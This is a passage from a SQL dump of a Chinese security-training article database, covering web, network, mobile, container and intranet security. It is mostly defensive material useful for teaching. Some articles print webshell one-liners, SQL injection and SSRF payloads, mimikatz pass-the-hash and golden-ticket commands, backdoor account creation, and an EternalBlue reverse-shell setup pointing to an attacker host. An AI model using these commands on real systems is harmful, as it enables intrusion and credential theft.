DNS缓存投毒\n攻击者向DNS服务器发送伪造的响应，污染DNS缓存，使用户访问恶意站点。\n\n### 2. DNS欺骗\n中间人攻击的一种，拦截DNS查询并返回伪造的IP地址。\n\n### 3. DNS隧道\n利用DNS协议传输数据，绕过网络防火墙。攻击者可以通过DNS查询请求传输恶意代码或数据。\n\n### 4. DDoS攻击\n对DNS服务器发起分布式拒绝服务攻击，导致DNS服务不可用。\n\n## 防护措施\n\n1. **启用DNSSEC**：为DNS响应添加数字签名验证\n2. **限制递归查询**：只对内部网络提供递归服务\n3. **使用可信的DNS服务器**：如8.8.8.8、1.1.1.1\n4. **监控DNS日志**：及时发现异常查询行为\n5. **部署DNS防火墙**：过滤恶意域名和查询','DNS解析过程、常见攻击方式及防护措施',1,'medium','DNS安全分析',1,0,0,'published','2026-04-01 11:09:40','2026-04-01 11:09:40'),(22,'HTTP/HTTPS协议详解','# HTTP/HTTPS协议详解\n\n## HTTP协议\n\n### HTTP工作原理\nHTTP（HyperText Transfer Protocol）是无状态的请求-响应协议。\n\n### HTTP请求方法\n| 方法 | 说明 | 安全性 |\n|------|------|--------|\n| GET | 获取资源 | 低 |\n| POST | 提交数据 | 中 |\n| PUT | 上传资源 | 低 |\n| DELETE | 删除资源 | 低 |\n| HEAD | 获取头部 | 低 |\n\n### HTTP状态码\n- **1xx**：信息响应\n- **2xx**：成功（200 OK）\n- **3xx**：重定向（301、302）\n- **4xx**：客户端错误（404、403）\n- **5xx**：服务器错误（500、502）\n\n## HTTPS安全机制\n\n### SSL/TLS握手过程\n1. 客户端发送支持的加密算法列表\n2. 服务器选择算法并发送证书\n3. 客户端验证证书有效性\n4. 双方生成会话密钥\n5. 加密通信开始\n\n### HTTPS优势\n- **加密传输**：防止中间人窃听\n- **身份认证**：验证服务器身份\n- **数据完整性**：防止数据篡改\n\n### 常见HTTPS安全问题\n1. **心脏滴血漏洞**：OpenSSL心跳扩展实现缺陷\n2. **SSL Strip攻击**：将HTTPS降级为HTTP\n3. **证书伪造**：使用自签名或伪造证书\n4. **弱加密算法**：使用已破解的加密算法\n\n## 安全建议\n- 强制使用HTTPS\n- 配置HSTS（HTTP严格传输安全）\n- 禁用SSLv2/v3和TLS1.0\n- 使用强加密套件','HTTP协议工作原理及HTTPS安全机制',1,'medium','Web安全基础',1,1,0,'published','2026-04-01 11:09:40','2026-04-04 13:59:51'),(23,'SQL注入漏洞原理与防御','# SQL注入漏洞原理与防御\n\n## 漏洞原理\n\nSQL注入（SQL Injection）是由于Web应用程序对用户输入未做充分验证和转义，导致攻击者可以在SQL语句中插入恶意代码。\n\n## 攻击原理示例\n\n### 正常查询\n```sql\nSELECT * FROM users WHERE username=\'admin\' AND password=\'123456\'\n```\n\n### 注入后\n```sql\nSELECT * FROM users WHERE username=\'admin\'--\' AND password=\'anything\'\n```\n`\'--` 将后面的密码验证注释掉，攻击者无需密码即可登录。\n\n## SQL注入类型\n\n### 1. 基于错误的注入\n通过构造特殊输入引发数据库错误，从错误信息中获取数据库结构。\n\n### 2. 联合查询注入\n使用UNION语句合并恶意查询结果。\n```sql\nSELECT name,email FROM users UNION SELECT username,password FROM admin_users--\n```\n\n### 3. 布尔盲注\n根据页面返回真假判断信息。\n\n### 4. 时间盲注\n利用数据库延时函数判断条件。\n\n### 5. 堆叠查询\n执行多条SQL语句。\n\n## 防御措施\n\n### 1. 参数化查询（最佳方案）\n```python\ncursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_id,))\n```\n\n### 2. 输入验证\n- 白名单验证\n- 类型检查\n- 长度限制\n\n### 3. 转义处理\n对特殊字符进行转义\n\n### 4. 最小权限原则\n数据库账户只授予必要的权限\n\n### 5. 错误处理\n生产环境关闭详细错误信息','SQL注入攻击原理、类型及防护方法',2,'medium','OWASP Top 10',1,2,0,'published','2026-04-01 11:09:40','2026-04-04 13:05:22'),(24,'XSS跨站脚本攻击详解','# XSS跨站脚本攻击详解\n\n## 漏洞原理\n\nXSS（Cross-Site Scripting）攻击是指攻击者通过在网页中注入恶意JavaScript代码，当其他用户浏览该网页时，恶意代码会在用户浏览器中执行。\n\n## XSS攻击类型\n\n### 1. 反射型XSS\n恶意脚本作为用户输入的一部分被服务器接收，然后未经转义地返回给用户。\n\n### 2. 存储型XSS\n恶意脚本被永久存储在目标服务器（如数据库、评论、论坛帖子），所有访问该数据的用户都会被攻击。\n\n### 3. DOM型XSS\n不涉及服务器处理，纯客户端漏洞。恶意脚本通过操作DOM对象来执行。\n\n## XSS攻击危害\n\n1. **窃取Cookie/Session**：获取用户认证信息\n2. **键盘记录**：监听用户键盘输入\n3. **钓鱼攻击**：修改页面内容欺骗用户\n4. **植入恶意软件**：下载并执行恶意程序\n5. **蠕虫传播**：自动传播XSS攻击\n\n## 防御措施\n\n### 1. 输入验证\n- 白名单验证\n- 限制输入长度\n- 过滤特殊字符\n\n### 2. 输出编码\n| 上下文 | 编码方式 |\n|--------|----------|\n| HTML内容 | `&lt;` `&gt;` `&amp;` |\n| HTML属性 | 使用双引号包裹 |\n| JavaScript | JSON编码 |\n\n### 3. 设置安全头部\n```http\nContent-Security-Policy: script-src \'self\'\n```\n\n### 4. HttpOnly Cookie\n```http\nSet-Cookie: session=xxx; HttpOnly\n```','XSS攻击类型、原理及防护策略',2,'medium','Web应用安全',1,2,0,'published','2026-04-01 11:09:40','2026-04-04 13:59:14'),(25,'CSRF跨站请求伪造','# CSRF跨站请求伪造\n\n## 漏洞原理\n\nCSRF（Cross-Site Request Forgery）攻击者利用用户已登录的身份，诱导用户访问恶意页面，在用户不知情的情况下以用户身份执行非自愿的操作。\n\n## 攻击示例\n\n```html\n<img src=\"http://bank.com/transfer?to=attacker&amount=10000\">\n```\n\n## 防御措施\n\n### 1. CSRF Token（最佳方案）\n服务器生成随机Token，在表单和Session中各存储一份。\n\n### 2. 验证请求来源\n检查HTTP头中的Referer或Origin字段。\n\n### 3. SameSite Cookie\n```http\nSet-Cookie: session=xxx; SameSite=Strict\n```\n\n### 4. 双重提交Cookie\n将Token同时放在Cookie和请求参数中','CSRF攻击原理与防护方法',2,'medium','Web安全实践',1,0,0,'published','2026-04-01 11:09:40','2026-04-01 11:24:55'),(26,'SSRF服务器端请求伪造','# SSRF服务器端请求伪造\n\n## 漏洞原理\n\nSSRF（Server-Side Request Forgery）攻击者利用Web应用程序的服务器作为代理，向内部系统或外部系统发起请求，从而突破网络边界限制。\n\n## 攻击场景\n\n### 1. 访问内部系统\n```\nhttp://example.com/fetch?url=http://192.168.1.100/admin\n```\n\n### 2. 读取本地文件\n```\nhttp://example.com/fetch?url=file:///etc/passwd\n```\n\n### 3. 攻击云服务元数据\n```\nhttp://example.com/fetch?url=http://169.254.169.254/latest/meta-data/\n```\n\n## 防御措施\n\n### 1. URL验证\n- 检查host是否为内网IP\n- 禁止访问私有IP地址段\n\n### 2. 协议限制\n- 限制允许的协议（http/https）\n- 禁止file://、dict://、gopher://等\n\n### 3. 白名单\n只允许访问预定义的URL列表','SSRF漏洞原理、攻击方式及防御',2,'hard','API安全',1,0,0,'published','2026-04-01 11:09:40','2026-04-01 11:24:55'),(27,'文件上传漏洞与防护','# 文件上传漏洞与防护\n\n## 漏洞原理\n\n文件上传功能如果没有正确验证上传文件的类型和内容，攻击者可以上传恶意文件（如WebShell）并在服务器上执行。\n\n## 攻击方式\n\n### WebShell上传\n```php\n<?php system($_GET[\'cmd\']); ?>\n```\n\n### 绕过验证\n- 扩展名绕过：1.php.jpg\n- 大小写绕过：1.PhP\n- 00截断：1.php\\x00.jpg\n- MIME类型欺骗\n\n## 防御措施\n\n### 1. 文件类型验证\n```python\nALLOWED_EXTENSIONS = {\'png\', \'jpg\', \'jpeg\', \'gif\'}\n```\n\n### 2. MIME类型验证\n```python\nif file.content_type not in [\'image/png\', \'image/jpeg\']:\n    abort(403)\n```\n\n### 3. 文件内容验证\n验证文件头（如图片的魔数）\n\n### 4. 存放策略\n- 上传文件存储在Web根目录之外\n- 使用随机文件名\n- 上传目录禁止执行\n\n### 5. 图片处理\n对上传图片进行重新生成，破坏恶意代码','文件上传漏洞原理及安全上传策略',2,'medium','Web应用安全',1,0,0,'published','2026-04-01 11:09:40','2026-04-01 11:24:55'),(28,'Android应用安全分析','# Android应用安全分析\n\n## 反编译防护\n\n### 混淆技术\n```gradle\nandroid {\n    buildTypes.release {\n        minifyEnabled true\n        proguardFiles getDefaultProguardFile(\'proguard-android-optimize.txt\')\n    }\n}\n```\n\n### 反调试检测\n```java\nboolean isDebuggable = (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;\n\n// 检测Frida\npublic static boolean isFridaRunning() {\n    File[] files = new File(\"/proc\").listFiles();\n    for (File file : files) {\n        if (file.isDirectory()) {\n            if (new FileInputStream(file.getAbsolutePath() + \"/cmdline\").read().toString().contains(\"frida\")) {\n                return true;\n            }\n        }\n    }\n    return false;\n}\n```\n\n## 数据安全\n\n### 安全存储\n```java\nMasterKey masterKey = new MasterKey.Builder(context)\n    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)\n    .build();\n\nSharedPreferences prefs = EncryptedSharedPreferences.create(context, \"secure_prefs\", masterKey);\n```','Android应用安全漏洞与防护措施',8,'medium','移动安全',1,0,0,'published','2026-04-01 11:09:40','2026-04-01 11:25:51'),(29,'iOS应用安全机制','# iOS应用安全机制\n\n## 代码签名\n\niOS要求所有应用必须经过Apple签名才能安装。\n\n## 安全特性\n\n### Data Protection API\n```swift\nlet fileManager = FileManager.default\ntry fileManager.setAttributes(\n    [.protectionKey: FileProtectionType.complete],\n    ofItemAtPath: \"sensitive_data.txt\"\n)\n```\n\n### Keychain安全\n```swift\nlet query: [String: Any] = [\n    kSecClass as String: kSecClassGenericPassword,\n    kSecAttrAccount as String: \"username\",\n    kSecValueData as String: \"password\".data(using: .utf8)!,\n    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly\n]\n```\n\n## 加固建议\n\n1. 启用ATS（App Transport Security）\n2. 使用TestFlight进行测试\n3. 定期更新安全补丁\n4. 代码混淆保护知识产权','iOS应用安全特性与防护方法',8,'medium','移动安全',1,0,0,'published','2026-04-01 11:09:40','2026-04-01 11:25:51'),(30,'网络空间搜索引擎利用','# 网络空间搜索引擎利用\n\n## Shodan\n\n### 基本用法\n```bash\nshodan search port:22 country:cn\nshodan search \'product:\"Apache\"\'\nshodan search vuln:cve-2021-44228\n```\n\n### API使用\n```python\nimport shodan\napi = shodan.API(\'YOUR_API_KEY\')\nresults = api.search(\'apache\')\nhost = api.host(\'8.8.8.8\')\n```\n\n## Censys\n\n### 查询语法\n```\n443.https.get.headers.server: Apache\n443.https.tls.certificates.leaf_data.subject.common_name: example.com\n```\n\n## FOFA（国内）\n\n```bash\napp=\"Apache\"\nregion=\"China\"\n```\n\n## 搜索技巧\n\n1. **端口筛选**：port:22, port:80, port:443\n2. **地理位置**：country:CN, city:Beijing\n3. **服务类型**：product:\"nginx\"\n4. **漏洞关联**：vuln:CVE-2021-xxxx','使用Shodan、Censys等搜索引擎发现资产',11,'medium','渗透测试',1,2,0,'published','2026-04-01 11:09:40','2026-04-04 13:40:55'),(31,'GitHub敏感信息泄露','# GitHub敏感信息泄露\n\n## 常见泄露类型\n\n1. **API密钥**\n   - AWS keys: AKIA...\n   - Google API keys: AIza...\n   - Stripe keys: sk_live...\n\n2. **凭据**\n   - 数据库连接字符串\n   - SMTP认证信息\n   - SSH密钥\n\n3. **配置文件**\n   - .env文件\n   - config.py\n   - settings.xml\n\n## GitHub搜索语法\n\n```bash\nfilename:.env DB_PASSWORD\nextension:.pem private\n\"aws_access_key\" language:YAML\n```\n\n## 检测工具\n\n### truffleHog\n```bash\ntrufflehog https://github.com/user/repo\n```\n\n### gitGraber\n```bash\ngitGraber -k wordlists/keywords.txt -q \"company_name\"\n```\n\n## 防护措施\n\n1. **使用GitHub Secret Scanning**\n2. **配置 .gitignore**\n3. **员工安全培训**\n4. **定期审计代码仓库**','发现GitHub上泄露的敏感信息',11,'medium','安全运维',1,2,0,'published','2026-04-01 11:09:40','2026-04-04 13:40:55'),(32,'DNS信息收集技术','# DNS信息收集技术\n\n## DNS查询工具\n\n### dig命令\n```bash\ndig example.com\ndig +trace example.com\ndig example.com MX\ndig example.com AXFR\n```\n\n### dnsenum\n```bash\ndnsenum example.com\n```\n\n## 子域名发现\n\n### 被动收集\n```bash\ncurl -s \"https://crt.sh/?q=%.example.com\"\namass enum -passive -d example.com\n```\n\n### 主动扫描\n```bash\ngobuster dns -d example.com -w wordlist.txt\nffuf -w wordlist.txt -u https://FUZZ.example.com\n```\n\n## DNS区域传送\n\n### 检测\n```bash\ndig @ns1.example.com example.com AXFR\n```\n\n## DNS数据利用\n\n1. 建立目标资产清单\n2. 发现隐藏服务\n3. 识别CDN和WAF\n4. 社工攻击面分析','DNS记录的查询与利用方法',11,'medium','渗透测试',1,2,0,'published','2026-04-01 11:09:40','2026-04-04 13:40:52'),(33,'ARP协议与ARP欺骗攻击','# ARP协议与ARP欺骗攻击\n\n## ARP协议原理\n\nARP（Address Resolution Protocol）用于将IP地址解析为MAC地址。\n\n### ARP工作流程\n1. 主机查询目标IP的MAC地址\n2. 广播ARP请求包\n3. 目标主机响应ARP reply\n4. 主机缓存IP-MAC对应关系\n\n## ARP欺骗攻击\n\n### 攻击原理\n攻击者发送伪造的ARP响应包，将自己的MAC地址绑定到受害者的IP地址。\n\n### 中间人攻击\n攻击者同时欺骗网关和目标主机，使得双向流量都经过攻击者。\n\n### 攻击工具\n- **arpwatch**：监控ARP变化\n- **ettercap**：ARP欺骗工具\n- **dsniff**：网络嗅探工具包\n\n## 防御措施\n\n1. **静态ARP表**：手动绑定关键IP-MAC\n2. **ARP防火墙**：检测和阻止异常ARP包\n3. **交换机的Dynamic ARP Inspection**：验证ARP包\n4. **802.1X认证**：端口接入控制\n5. **加密通信**：使用VPN或TLS','ARP协议工作原理及ARP欺骗防御',1,'medium','网络安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(34,'DHCP协议与DHCP攻击','# DHCP协议与DHCP攻击\n\n## DHCP工作原理\n\nDHCP（Dynamic Host Configuration Protocol）动态分配IP地址。\n\n### 四步获取过程（DORA）\n1. **Discover**：客户端广播发现包\n2. **Offer**：服务器提供IP地址\n3. **Request**：客户端请求IP\n4. **Ack**：服务器确认\n\n## DHCP攻击\n\n### 1. DHCP欺骗\n攻击者部署恶意DHCP服务器，提供错误配置：\n- 虚假网关 → 流量导向攻击者\n- 虚假DNS服务器 → 钓鱼攻击\n\n### 2. DHCP饥饿攻击\n攻击者发送大量DHCP请求耗尽地址池。\n\n## 防御措施\n\n1. **DHCP Snooping**：交换机启用，信任端口白名单\n2. **ARP检测**：配合动态ARP检测\n3. **端口安全**：限制每个端口的MAC数\n4. **监控**：部署DHCP监听服务器','DHCP工作原理及安全威胁',1,'easy','网络安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(35,'VPN技术与安全','# VPN技术与安全\n\n## VPN原理\n\nVPN（Virtual Private Network）通过公网建立加密隧道，实现安全通信。\n\n## VPN类型\n\n### 1. 远程访问VPN\n个人用户连接企业网络\n- SSL VPN（WebVPN）\n- PPTP VPN\n- L2TP/IPSec VPN\n\n### 2. 站点到站点VPN\n连接两个局域网\n- IPSec VPN\n- GRE隧道\n- MPLS VPN\n\n## 常用VPN协议\n\n### IPSec\n- 加密：ESP（Encapsulating Security Payload）\n- 认证：AH（Authentication Header）\n- 密钥交换：IKEv1/IKEv2\n\n### SSL/TLS VPN\n- 基于浏览器\n- 适合远程办公\n- 配置简单\n\n## 安全建议\n\n1. **强密码策略**：复杂的预共享密钥\n2. **双因素认证**：结合证书+密码\n3. **定期更新密钥**：避免长期使用同一密钥\n4. **日志审计**：记录VPN访问行为\n5. **流量加密**：使用强加密算法（AES-256）','VPN原理、类型及安全考虑',1,'medium','网络安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(36,'无线网络WiFi安全','# 无线网络WiFi安全\n\n## WiFi加密协议\n\n### WEP（Wired Equivalent Privacy）\n- 已被完全破解\n- RC4加密，40/104位密钥\n- 不应再使用\n\n### WPA（WiFi Protected Access）\n- 过渡性协议\n- TKIP加密\n- 仍有安全漏洞\n\n### WPA2\n- 当前主流\n- AES-CCMP加密\n- 2017年被KRACK攻击破解\n\n### WPA3\n- 最新标准\n- SAE握手协议\n- 防暴力破解\n\n## 常见WiFi攻击\n\n### 1. WEP破解\n- FMS攻击、 chopchop攻击\n- 利用IV（初始向量）弱点\n\n### 2. WPA/WPA2破解\n- 字典攻击PSK\n- 离线破解握手包\n\n### 3. 恶意热点（Evil Twin）\n- 创建同名伪造热点\n- 中间人监听流量\n\n### 4. KRACK攻击\n- 密钥重装攻击\n- 攻击WPA2四次握手\n\n## 安全建议\n\n1. **使用WPA3或强WPA2**\n2. **设置复杂WiFi密码**\n3. **隐藏SSID广播**\n4. **MAC地址过滤**\n5. **企业级802.1X认证**\n6. **定期更换密码**\n7. **分离访客网络**','WiFi加密协议与安全防护',1,'medium','无线安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(37,'命令注入漏洞','# 命令注入漏洞\n\n## 漏洞原理\n\n应用程序调用系统命令时，未对用户输入进行充分过滤，导致攻击者可以注入额外命令。\n\n## 危险函数\n\n### PHP\n```php\nsystem($_GET[\'cmd\']);\nexec($_POST[\'cmd\']);\nshell_exec($_REQUEST[\'cmd\']);\n```\n\n### Python\n```python\nos.system(user_input)\nsubprocess.call(user_input, shell=True)\n```\n\n### Java\n```java\nRuntime.getRuntime().exec(user_input);\n```\n\n## 防御措施\n\n### 1. 避免使用系统命令\n优先使用语言原生API而非调用系统命令。\n\n### 2. 输入验证\n白名单验证允许的命令和参数。\n\n### 3. 参数化命令\n使用数组形式传递参数，避免shell解析。\n\n```python\n# 不安全\nsubprocess.call(f\"ls {user_dir}\", shell=True)\n\n# 安全\nsubprocess.call([\"ls\", user_dir])\n```\n\n### 4. 权限限制\n以低权限用户运行Web服务。','命令注入攻击原理与防御',2,'hard','Web安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(38,'JSONP安全与CORS配置','# JSONP安全与CORS配置\n\n## JSONP劫持\n\n### 原理\nJSONP通过<script>标签绕过同源策略获取数据，攻击者可构造恶意页面劫持数据。\n\n### 攻击流程\n1. 用户登录目标网站\n2. 访问攻击者恶意页面\n3. 页面通过JSONP获取用户敏感数据\n4. 发送数据到攻击者服务器\n\n## CORS（跨域资源共享）\n\n### 敏感配置\n```http\nAccess-Control-Allow-Origin: *\n```\n允许所有来源访问，非常危险！\n\n### 安全配置\n```http\nAccess-Control-Allow-Origin: https://trusted.com\nAccess-Control-Allow-Credentials: true\n```\n\n## 防御措施\n\n1. **避免使用JSONP**\n2. **严格配置CORS白名单**\n3. **验证请求来源**\n4. **使用Token验证**\n5. **敏感操作使用POST而非GET**','JSONP劫持与跨域安全配置',2,'medium','Web安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(39,'WebSocket安全','# WebSocket安全\n\n## WebSocket简介\n\nWebSocket提供双向持久连接通信，常用于实时应用。\n\n## 安全问题\n\n### 1. 缺乏认证\nWebSocket握手时不进行身份验证。\n\n### 2. 同源策略绕过\nWebSocket不受同源策略限制。\n\n### 3. 跨站WebSocket劫持（CSWSH）\n攻击者利用用户身份发起WebSocket连接。\n\n## 防护措施\n\n### 1. 验证Origin头\n```javascript\nconst origin = request.headers.origin;\nif (!allowedOrigins.includes(origin)) {\n  reject();\n}\n```\n\n### 2. 使用WSS（WebSocket Secure）\n```javascript\nconst ws = new WebSocket(\'wss://secure.example.com\');\n```\n\n### 3. 身份Token验证\n在WebSocket消息中携带认证Token。\n\n### 4. 消息级认证\n每条消息包含签名或Token。\n\n### 5. 输入验证\n对所有接收的消息进行严格验证。','WebSocket协议的安全问题与防护',2,'hard','Web安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(40,'Docker容器安全','# Docker容器安全\n\n## 镜像安全\n\n### 1. 最小化镜像\n- 使用Alpine等轻量镜像\n- 多阶段构建\n- 移除不必要的工具\n\n### 2. 镜像扫描\n```bash\ndocker scan image_name\ntrivy image image_name\n```\n\n## 容器运行安全\n\n### 1. 非root运行\n```dockerfile\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\nUSER appuser\n```\n\n### 2. 资源限制\n```bash\ndocker run --memory=\"256m\" --cpus=\"0.5\"\n```\n\n### 3. 安全选项\n```bash\ndocker run --security-opt=no-new-privileges:true\ndocker run --read-only\n```\n\n## 网络安全\n\n### 限制网络访问\n```bash\ndocker network create --internal isolated_net\ndocker network connect isolated_net container\n```\n\n## 密钥管理\n\n### 使用Docker Secrets\n```bash\necho \"password\" | docker secret create db_password -\n```\n\n## 监控与审计\n\n### 日志配置\n```json\n{\n  \"log-driver\": \"json-file\",\n  \"log-opts\": {\n    \"max-size\": \"10m\",\n    \"max-file\": \"3\"\n  }\n}\n```','Docker容器安全配置与最佳实践',3,'hard','容器安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(41,'Kubernetes安全','# Kubernetes安全\n\n## Pod安全\n\n### 1. 安全上下文\n```yaml\nsecurityContext:\n  runAsNonRoot: true\n  runAsUser: 1000\n  readOnlyRootFilesystem: true\n```\n\n### 2. 资源限制\n```yaml\nresources:\n  limits:\n    memory: \"128Mi\"\n    cpu: \"500m\"\n  requests:\n    memory: \"64Mi\"\n    cpu: \"250m\"\n```\n\n## 网络策略\n\n###  默认拒绝\n```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny\nspec:\n  podSelector: {}\n```\n\n## RBAC权限控制\n\n### 最小权限原则\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: app-reader\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\", \"list\"]\n```\n\n## 敏感信息保护\n\n### 使用Secrets\n```yaml\napiVersion: v1\nkind: Secret\nmetadata:\n  name: db-credentials\ntype: Opaque\nstringData:\n  password: password123\n```\n\n### 外部密钥管理\n集成Vault、AWS Secrets Manager等外部密钥管理系统。\n\n## 镜像安全\n\n1. 定期扫描镜像漏洞\n2. 使用私有镜像仓库\n3. 签名镜像内容','K8s集群安全配置与防护',3,'hard','云原生安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(42,'TLS/SSL证书安全','# TLS/SSL证书安全\n\n## TLS握手过程\n\n1. 客户端发送支持的加密算法列表\n2. 服务器选择算法并发送证书\n3. 客户端验证证书有效性\n4. 双方生成会话密钥\n5. 加密通信开始\n\n## TLS版本安全\n\n| 版本 | 状态 |\n|------|------|\n| SSLv2 | 禁用（不安全） |\n| SSLv3 | 禁用（POODLE攻击） |\n| TLS1.0 | 禁用（脆弱） |\n| TLS1.1 | 禁用 |\n| TLS1.2 | 推奨 |\n| TLS1.3 | 最新，最安全 |\n\n## 证书配置检查\n\n```bash\n# 检查证书信息\nopenssl s_client -connect example.com:443\n\n# 检查支持的密码套件\nopenssl s_client -connect example.com:443 -cipher \'!NULL\'\n```\n\n## 安全配置\n\n### Nginx配置\n```nginx\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;\nssl_prefer_server_ciphers on;\nssl_session_cache shared:SSL:10m;\n```','TLS协议工作原理与证书配置',4,'medium','Web安全',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(43,'JWT安全','# JWT安全\n\n## JWT结构\n\nJWT由三部分组成：Header.Payload.Signature\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ._signature\n```\n\n## 安全问题\n\n### 1. 算法None\n攻击者将alg改为none，删除签名。\n\n### 2. 密钥混淆（Key Confusion）\n将算法从RS256改为HS256，使用公钥作为对称密钥验证。\n\n### 3. 敏感信息泄露\n在Payload中存储敏感信息（Base64可解密）。\n\n## 安全最佳实践\n\n### 1. 验证算法\n```javascript\nif (token.header.alg !== \'RS256\') {\n  return reject(\'Invalid algorithm\');\n}\n```\n\n### 2. 验证签名\n使用服务器私钥验证签名。\n\n### 3. 设置过期时间\n```javascript\nconst token = jwt.sign(\n  { userId: user.id },\n  privateKey,\n  { expiresIn: \'1h\' }\n);\n```\n\n### 4. 存储安全\n- HttpOnly Cookie存储\n- 不要存储在LocalStorage\n- 配合CSRF保护','JSON Web Token的安全问题与最佳实践',4,'medium','身份认证',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(44,'内网渗透技术','# 内网渗透技术\n\n## 横向移动\n\n### 1. Pass the Hash\n利用NTLM哈希直接认证，无需明文密码。\n```bash\nmimikatz sekurlsa::pth /user:admin /ntlm:hash /domain:target.com\n```\n\n### 2. Pass the Ticket\n窃取Kerberos票据进行认证。\n```bash\nmimikatz sekurlsa::tickets /export\n```\n\n### 3. 远程服务利用\n```bash\npsexec.py target.com/admin@target_server\nwmiexec.py target.com/admin@target_server\n```\n\n## 权限维持\n\n### 1. 创建后门账户\n```bash\nnet user hacker password /add\nnet localgroup Administrators hacker /add\n```\n\n### 2. 计划任务后门\n```bash\nschtasks /create /sc minute /mo 1 /tn \"Update\" /tr \"payload\"\n```\n\n### 3. 服务后门\n将恶意程序注册为Windows服务。\n\n## 票据伪造\n\n### Golden Ticket\n伪造TGT，获取任意用户权限。\n```bash\nmimikatz kerberos::golden /user:admin /domain:target.com /sid:S-1-5-21 /krbtgt:hash\n```\n\n### Silver Ticket\n伪造TGS，访问特定服务。','内网横向移动与权限维持',5,'hard','内网渗透',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(45,'Metasploit渗透框架','# Metasploit渗透框架\n\n## 基本命令\n\n```bash\nmsfconsole\nsearch exploit_name\nuse exploit_path\nshow options\nset PAYLOAD payload_name\nset RHOST target_ip\nexploit\n```\n\n## 模块类型\n\n| 模块 | 说明 |\n|------|------|\n| auxiliary | 辅助模块（扫描、嗅探） |\n| exploit | 漏洞利用模块 |\n| payload | 攻击载荷 |\n| post | 后渗透模块 |\n| encoder | 编码器 |\n| nop | 空操作生成器 |\n\n## 漏洞利用示例\n\n### MS17-010（永恒之蓝）\n```bash\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nexploit\n```\n\n## Meterpreter常用命令\n\n```bash\n# 获取系统信息\nsysinfo\n\n# 获取密码哈希\nhashdump\n\n# 截图\nscreenshot\n\n# 开启远程桌面\nrun getgui -e\n\n# 权限提升\ngetsystem\n```','Metasploit框架使用与模块开发',5,'hard','渗透工具',1,2,0,'published','2026-04-01 11:24:55','2026-04-04 13:41:10'),(46,'WebShell检测与清除','# WebShell检测与清除\n\n## WebShell特征\n\n### PHP WebShell\n```php\n<?php system($_GET[\'cmd\']); ?>\n<?php eval($_POST[\'x\']); ?>\n<?php assert($_REQUEST[\'cmd\']); ?>\n```\n\n### 常见特征\n- 特殊函数调用（system、exec、eval、assert）\n- base64编码内容\n- 隐藏技术（文件伪装、图片伪装）\n- 变形技术\n\n## 检测方法\n\n### 1. 静态特征检测\n```bash\n# 查找可疑PHP文件\nfind /var/www -name \"*.php\" -mtime -1\ngrep -r \"eval|base64_decode|system|exec\" /var/www/\n\n# 使用D盾\npython ant_webshell.py /var/www\n```\n\n### 2. 流量分析\n- 检测异常外网连接\n- 分析POST请求特征\n\n### 3. 日志分析\n```bash\n# 查找异常请求\ngrep -E \"\\.php\\?.*=.{50,}\" access.log\n```\n\n## 清除流程\n\n1. 确认WebShell位置\n2. 分析入侵路径\n3. 清除所有WebShell文件\n4. 修复漏洞入口\n5. 加强安全配置\n6. 持续监控','WebShell特征分析与安全处置',6,'hard','Web安全运维',1,0,0,'published','2026-04-01 11:24:55','2026-04-01 11:24:55'),(47,'日志分析溯源','# 日志分析溯源\n\n## 关键日志位置\n\n### Linux\n```\n/var/log/auth.log       # 认证日志\n/var/log/secure         # 安全日志\n/var/log/apache2/       # Web日志\n/var/log/nginx/          # Nginx日志\n/var/log/messages        # 系统消息\n```\n\n### Windows\n```\nC:\\Windows\\System32\\winevt\\Logs\\\n- Security.evtx     # 安全事件\n- System.evtx       # 系统事件\n- Application.evtx # 应用事件\n```\n\n## 常用分析命令\n\n### SSH暴力破解\n```bash\ngrep \"Failed password\" /var/log/auth.log\ngrep \"Accepted\" /var/log/auth.log\n```\n\n### Web攻击检测\n```bash\n# 查找SQL注入\ngrep -E \"union|select|exec\" access.log\n\n# 查找扫描行为\nawk \'{print $1}\' access.log | sort | uniq -c | sort -nr | head -20\n```\n\n### 异常登录\n```bash\n# 非正常时间登录\ngrep -E \"([0-2][0-9]:[0-5][0-9])\" auth.log\n\n# 异地登录\nlastlog | grep -v \"Never\"\n```\n\n## 溯源方法\n\n1. **时间线重构**：按时间顺序排列事件\n2. **攻击链分析**：Kill Chain模型\n3. **关联分析**：多源日志关联\n4. **IoC匹配**：威胁情报比对','安全日志分析与攻击溯源方法',6,'hard','安全运维',1,1,0,'published','2026-04-01 11:25:51','2026-04-04 13:59:33'),(48,'数据库安全','# 数据库安全\n\n## MySQL安全\n\n### 1. 最小权限原则\n```sql\nGRANT SELECT, INSERT ON app_db.* TO \'app_user\'@\'localhost\';\nREVOKE DELETE, DROP ON app_db.* FROM \'app_user\'@\'localhost\';\n```\n\n### 2. 密码策略\n```sql\nSET 